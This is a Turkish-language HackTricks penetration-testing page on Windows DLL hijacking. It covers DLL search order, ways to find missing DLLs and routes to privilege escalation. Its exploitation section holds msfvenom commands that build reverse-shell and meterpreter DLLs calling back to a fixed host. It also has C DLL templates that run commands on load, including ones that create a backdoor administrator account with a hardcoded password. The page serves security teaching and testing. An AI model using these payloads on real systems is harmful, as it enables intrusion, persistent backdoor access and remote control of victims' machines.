# Dll Hijacking

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, **hackers tarafından, hackers için oluşturulmuş bir premium hata ödülü platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katılın ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü niyetli bir DLL yüklemesini sağlamak için manipüle edilmesini içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada yükseltmeye odaklanılmasına rağmen, kaçırma yöntemi hedefler arasında tutarlıdır.

### Yaygın Teknikler

DLL hijacking için birkaç yöntem kullanılmaktadır, her biri uygulamanın DLL yükleme stratejisine bağlı olarak etkinliği değişir:

1. **DLL Değiştirme**: Gerçek bir DLL'i kötü niyetli bir DLL ile değiştirmek, isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Arama Sırası Kaçırma**: Kötü niyetli DLL'i meşru olanın önünde bir arama yoluna yerleştirmek, uygulamanın arama desenini istismar etmek.
3. **Phantom DLL Kaçırma**: Bir uygulamanın yüklemesi için kötü niyetli bir DLL oluşturmak, bunun var olmayan bir gerekli DLL olduğunu düşünerek.
4. **DLL Yönlendirme**: Uygulamayı kötü niyetli DLL'e yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Değiştirme**: Meşru DLL'i WinSxS dizininde kötü niyetli bir karşıtı ile değiştirmek, genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Göreceli Yol DLL Kaçırma**: Kötü niyetli DLL'i kopyalanmış uygulama ile kullanıcı kontrolündeki bir dizine yerleştirmek, Binary Proxy Execution tekniklerine benzer.

## Eksik Dll'leri Bulma

Bir sistemde eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmaktır, **aşağıdaki 2 filtreyi ayarlayarak**:

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

ve sadece **Dosya Sistemi Etkinliğini** gösterin:

![](<../../../.gitbook/assets/image (153).png>)

Eğer **genel olarak eksik dll'ler** arıyorsanız, bunu birkaç **saniye** çalıştırabilirsiniz.\
Eğer **belirli bir yürütülebilir dosya içinde eksik bir dll** arıyorsanız, **"Process Name" "contains" "\<exec name>"** gibi **başka bir filtre ayarlamalı, çalıştırmalı ve olayları yakalamayı durdurmalısınız**.

## Eksik Dll'leri Sömürme

Ayrıcalıkları yükseltmek için en iyi şansımız, **bir ayrıcalıklı sürecin yüklemeye çalışacağı bir dll yazabilmektir** ve bu dll'in **arama yapılacak yerlerden birinde** olmasıdır. Bu nedenle, **orijinal dll'in** bulunduğu dizinden önce **dll'in arandığı** bir **dizine** yazabileceğiz (garip bir durum), ya da **dll'in arandığı** bir dizine yazabileceğiz ve orijinal **dll herhangi bir dizinde mevcut değildir**.

### Dll Arama Sırası

**Microsoft belgelerinde** [**DLL'lerin nasıl yüklendiğini**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **bulabilirsiniz.**

**Windows uygulamaları**, belirli bir sıraya uyarak, **önceden tanımlanmış arama yolları** setini takip ederek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesiyle ortaya çıkar, bu da onun gerçek DLL'den önce yüklenmesini sağlar. Bunu önlemenin bir çözümü, uygulamanın ihtiyaç duyduğu DLL'lere atıfta bulunurken mutlak yollar kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemlerde **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur, ancak arama yapılır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt defteri anahtarı tarafından belirtilen uygulama başına yolu içermediğini unutmayın. **App Paths** anahtarı, DLL arama yolunu hesaplarken kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda **varsayılan** arama sırasıdır. Devre dışı bırakıldığında, geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için, **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** ile çağrılırsa, arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, **bir dll'in yalnızca adını değil, mutlak yolunu belirterek yüklenebileceğini** unutmayın. Bu durumda, o dll **yalnızca o yolda aranacaktır** (eğer dll'in herhangi bir bağımlılığı varsa, bunlar yalnızca adla yüklendiği gibi aranacaktır).

Arama sırasını değiştirmek için başka yollar da vardır, ancak bunları burada açıklamayacağım.

#### Windows belgelerinden dll arama sırasındaki istisnalar

Windows belgelerinde standart DLL arama sırasına belirli istisnalar belirtilmiştir:

* **Bellekte zaten yüklenmiş bir DLL ile aynı adı paylaşan bir DLL** ile karşılaşıldığında, sistem genellikle aramayı atlar. Bunun yerine, yönlendirme ve bir manifest kontrolü yapar ve ardından bellekteki zaten yüklenmiş DLL'e geri döner. **Bu senaryoda, sistem DLL için bir arama yapmaz**.
* DLL, mevcut Windows sürümü için **bilinen bir DLL** olarak tanındığında, sistem, arama sürecini atlayarak, bilinen DLL'in kendi sürümünü ve bağımlı DLL'lerini kullanır. Kayıt defteri anahtarı **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**, bu bilinen DLL'lerin bir listesini tutar.
* Eğer bir **DLL bağımlılıkları varsa**, bu bağımlı DLL'ler için arama, yalnızca **modül adlarıyla** belirtilmiş gibi gerçekleştirilir, başlangıçta DLL'in tam yoluyla tanımlanıp tanımlanmadığına bakılmaksızın.

### Ayrıcalıkları Yükseltme

**Gereksinimler**:

* **Farklı ayrıcalıklar** altında çalışan veya çalışacak bir süreci (yatay veya yan hareket) tanımlayın, bu süreç **bir DLL'den yoksundur**.
* **DLL**'nin **arama yapılacak** herhangi bir **dizinde yazma erişiminin** mevcut olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Evet, gereksinimler, **varsayılan olarak, ayrıcalıklı bir yürütülebilir dosyanın eksik bir dll bulmasının garip olması** nedeniyle bulması zor. Ayrıca, **sistem yolu dizininde yazma izinlerine sahip olmak** (varsayılan olarak yapamazsınız) daha da garip. Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
Eğer şanslıysanız ve gereksinimleri karşıladığınızı bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesine göz atabilirsiniz. Projenin **ana hedefi UAC'yi atlatmak olsa da**, orada kullanabileceğiniz Windows sürümü için bir Dll hijacking **PoC** bulabilirsiniz (muhtemelen yalnızca yazma izinlerinizin olduğu dizinin yolunu değiştirerek).

Bir dizindeki **izinlerinizi kontrol edebileceğinizi** unutmayın:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol et**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
You can also check the imports of an executable and the exports of a dll with:

```markdown
Bir yürütülebilir dosyanın içe aktarımlarını ve bir dll'nin dışa aktarımlarını kontrol edebilirsiniz:
```
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Tam yetkileri artırmak için **Dll Hijacking'i kötüye kullanma** hakkında tam bir rehber için **System Path klasöründe yazma izinlerinizin olup olmadığını kontrol etmek için** bakın:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Otomatik araçlar

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem PATH içindeki herhangi bir klasörde yazma izinlerinizin olup olmadığını kontrol edecektir.\
Bu açığı keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonlarıdır**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

Eğer istismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmek için en önemli şeylerden biri **çalıştırılacak dosyanın içe aktaracağı tüm fonksiyonları en azından dışa aktaran bir dll oluşturmak** olacaktır. Her neyse, Dll Hijacking'in [Orta Bütünlük seviyesinden Yüksek **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/#uac) veya [**Yüksek Bütünlükten SYSTEM'e**](../#from-high-integrity-to-system)** yükselmek için kullanışlı olduğunu unutmayın.** **Geçerli bir dll oluşturma** hakkında bir örneği, yürütme için dll hijacking'e odaklanan bu dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **bir sonraki bölümde** bazı **temel dll kodları** bulabilirsiniz; bunlar **şablon** olarak veya **gerekli olmayan dışa aktarılan fonksiyonlarla bir dll oluşturmak** için faydalı olabilir.

## **Dll Oluşturma ve Derleme**

### **Dll Proxyleme**

Temelde bir **Dll proxy**, yüklendiğinde **kötü niyetli kodunuzu çalıştırabilen** ama aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** **gerekli** olarak **çalışan** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, aslında **bir çalıştırılabilir dosya belirtebilir ve proxylemek istediğiniz kütüphaneyi seçebilir** ve **proxylenmiş bir dll oluşturabilirsiniz** veya **Dll'i belirtebilir ve proxylenmiş bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter al (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 versiyonunu görmedim):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Dll'yi derlediğinizde, **kurban süreci tarafından yüklenecek birkaç fonksiyonu dışa aktarmanız** gerektiğini unutmayın. Bu fonksiyonlar mevcut değilse, **ikili dosya bunları yükleyemeyecek** ve **sömürü başarısız olacaktır**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referanslar

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **hackerlar tarafından, hackerlar için oluşturulmuş premium** **Intigriti** **hata ödülü platformuna** **kaydolun**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katılın ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
